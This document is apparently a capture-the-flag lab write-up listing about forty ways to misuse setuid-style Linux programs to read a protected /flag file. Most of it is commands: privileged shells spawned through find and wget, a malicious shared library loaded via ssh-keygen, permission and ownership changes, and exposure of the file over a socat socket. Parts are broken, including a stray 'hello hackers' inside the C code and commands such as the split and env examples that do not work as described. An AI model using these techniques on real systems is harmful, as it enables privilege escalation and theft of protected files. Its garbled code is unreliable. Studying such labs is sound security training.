# program misuse

## cat

```bash
cat /flag
```

Directly reads the contents of the flag file.


## more

```bash
more /flag
```

Displays the flag one screen at a time.


## less

```bash
less /flag
```

Allows navigation within the flag content interactively.


## tail

```bash
tail -n +1 /flag
```

Prints the flag starting from the first line.


## head

```bash
head -n 10 /flag
```

Prints the first 10 lines of the flag (or fewer if shorter).


## sort

```bash
sort /flag
```

Sorts lines in the flag file alphabetically (if multiple lines).


## vim

```bash
vim /flag
```

Opens the flag in the Vim text editor. Use **`:q!`** to exit.


## nano

```bash
nano /flag
```

Opens the flag in the Nano text editor. Use **`Ctrl+X`** to exit.


## rev

```bash
rev /flag | rev
```

Reverses the flag twice to retrieve original content.


## base32

```bash
base32 /flag | base32 -d
```

Encodes the flag to base32 then decodes it back.


## base64

```bash
base64 /flag | base64 -d
```

Encodes the flag to base64 then decodes it back.


## split

```bash
split -b 10 /flag parts_ && cat parts_
```

Splits the flag, then ****\`cat\` the parts****.


## cpio

```bash
find /flag | cpio -o > flag.cpio
```

Use **`cpio`** to archive the flag file. You can then inspect or move it.


## genisoimage

```bash
genisoimage -o output.iso flag
sudo mount -o loop output.iso /mnt/iso
cat /mnt/iso/flag
```

Creates an ISO containing the flag and mounts it to read the file.


## env

```bash
env MESSAGE=$(<flag) echo $MESSAGE
```

Injects the flag into an environment variable and prints it.


## find

```bash
find flag -exec /bin/sh -p \;
```

Uses **`find`** with **`-exec`** to spawn a shell with privileges.

In the new shell:

```bash
cat flag
```


## od

```bash
od -t c flag
```

Prints the flag in ASCII format using **`od`**.


## make

```bash
make -f /dev/stdin <<<"read_file: ; cat /flag"
```

Defines a temporary Makefile rule to print the flag.


## nice

```bash
nice cat /flag
```

Runs **`cat`** under **`nice`**, which was enough to access the flag.


## timeout

```bash
timeout 5 cat /flag
```

Executes **`cat`** with a time limit.


## stdbuf

```bash
stdbuf -i0 cat /flag
```

Disables buffering to read the flag immediately.


## setarch

```bash
setarch x86_64 cat /flag
```

Bypasses some restrictions via changing the execution environment.


## watch

```bash
watch -b cat /flag
```

Repeats execution of **`cat /flag`**, bypassing output filtering.


## socat

```bash
socat TCP-LISTEN:1234,reuseaddr,fork EXEC:"cat /flag"
```

Exposes the flag over a network socket.


## whiptail

```bash
whiptail --textbox /flag 10 200
```

Displays the flag in a textbox UI dialog.


## awk

```bash
awk '{print}' /flag
```

Prints each line of the flag using **`awk`**.


## sed

```bash
sed '' /flag
```

Reads the file through **`sed`** with a no-op script.


## ed

```bash
ed /flag
```

Opens the file in the line editor **`ed`**. Press **`p`** to print, **`q`** to quit.


## chown

```bash
chown hacker /flag
cat /flag
```

Changes ownership so it can be read.


## chmod

```bash
chmod a+r /flag
cat /flag
```

Makes the file world-readable.


## cp

```bash
cp /flag /dev/stdout
```

Copies the flag directly to stdout.


## mv

```bash
mv /flag /home/hacker/
cat /home/hacker/flag
```

Moves the flag to an accessible directory.


## perl

```bash
perl -ne 'print' /flag
```

Uses Perl to print the flag line by line.


## bash

```bash
bash -c 'cat /flag'
```

Executes **`cat`** in a subshell.


## date

```bash
date -f /flag
```

Forces **`date`** to read from the flag file, which is printed as an error.


## dmesg

```bash
dmesg -f /flag
```

Tries parsing **`/flag`** as a log filter and reveals content.


## wc

```bash
wc --files0-from=/flag
```

Tries to treat the flag file as input source list, revealing content.


## gcc

```bash
gcc -specs=/flag
```

Tries to compile using flag file as specs.


## as

```bash
as -a /flag
```

Passes the flag to the assembler to trigger readable output.


## wget

```bash
F=$(mktemp) && chmod +x $F && echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$F && wget --use-askpass=$F 0
```

Crafts a temporary shell script and abuses **`wget --use-askpass`**.


## ssh-keygen

```c
#include <stdio.h>

void C_GetFunctionList(void) {
    FILE *fp = fopen("/flag", "r");

    char buffer[256];hello hackers
    while (fgets(buffer, sizeof(buffer), fp)) {
        fputs(buffer, stdout);
    }
}
```

```bash
gcc -fPIC -shared -o lib.so solve.c
/challenge/ssh-keygen -D lib.so
```

